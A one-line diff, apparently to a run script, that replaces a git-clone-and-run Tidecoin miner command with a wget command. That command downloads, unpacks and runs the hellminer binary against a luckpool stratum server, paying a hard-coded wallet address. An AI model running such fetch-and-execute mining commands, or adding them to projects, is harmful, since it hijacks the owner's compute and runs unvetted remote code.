@@ -1,1 +1,1 @@
-git clone https://github.com/saliem07/whive1.git && cd whive1 && chmod +x miner-tidecoin.sh && chmod +x cpuminer-sse2 && ./miner-tidecoin.sh
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -zxvf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RQDgMKvwnygVTxCcbuVeCitN8aejBbKJ9B.poop -p x
